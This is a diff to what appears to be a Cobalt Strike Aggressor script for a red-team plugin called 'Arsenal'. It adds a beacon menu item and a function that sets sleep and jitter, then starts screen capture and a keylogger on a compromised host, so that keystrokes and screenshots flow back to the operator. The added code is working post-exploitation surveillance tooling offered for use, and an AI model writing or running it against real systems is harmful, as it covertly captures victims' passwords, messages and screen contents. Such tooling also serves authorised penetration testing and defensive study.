@@ -85,6 +85,7 @@
 #   - adds beacon popup menu called "Arsenal" with following sub-menus:
 #       - "Job Kill" allowing to review list of running Jobs in a Beacon and select one to kill it.
 #       - "Mass Run" offering: Checkin, Jobs, Getuid, Shell, Powershell, Powerpick
+#       - "Schedule Keylogger and Screenwatch" helper to instantly run sleep + screenwatch + keylogger on a beacon
 #       - "Launch": offering handy way of invoking our defined "launch-" aliases
 #
 #   - adds several auto-notes to Beacons on events such as: sleep changed, initial check-in, exit, 
@@ -966,10 +967,18 @@ popup beacon_bottom {
             }
         }
 
+        item "&Schedule Keylogger and Screenwatch" {
+        	foreach $bid ($1) {
+                prompt_text("What Sleep to set? Impacts how often you receive screenshots and keystrokes:", "", lambda({
+                    arsenal::scheduleKeyloggerScreenwatch($bid, $1);
+                }, $bid => $bid));
+            }
+        }
+
         separator();
 
         item "&Cancel all downloads" {
-            bcancel($1, "*");
+        	bcancel($1, "*");
         }
 
         item "&Set Arsenal note" {
@@ -2469,6 +2478,36 @@ sub arsenal::syncDownloadedFiles {
     }
 
     arsenal::info("Synced all downloaded files.");
+}
+
+sub arsenal::scheduleKeyloggerScreenwatch {
+	$bid = $1;
+	$sleepTime = $2;
+	$time = 0;
+	$jitter = 0;
+
+	if(indexOf($sleepTime, " ")) {
+		($a, $b) = split(' ', $sleepTime);
+		$time = parseNumber($a);
+		$jitter = parseNumber($b);
+	}
+	else {
+		$time = parseNumber($sleepTime);
+	}
+
+	blog($bid, "Beacon Monitor 1: Setting sleep to $time (jitter: $jitter $+ )");
+	binput($bid, "sleep $time $jitter");
+	bsleep($bid, $time, $jitter);
+
+	blog($bid, "Beacon Monitor 2: Launching screenwatch");
+	binput($bid, "screenwatch");
+	bscreenwatch($bid);
+
+	blog($bid, "Beacon Monitor 3: Launching keylogger");
+	binput($bid, "keylogger");
+	bkeylogger($bid, binfo($bid, "pid"), binfo($bid, "arch"));
+
+	blog($bid, "Expect screenshots and keystrokes.");
 }
 
 sub arsenal::note {
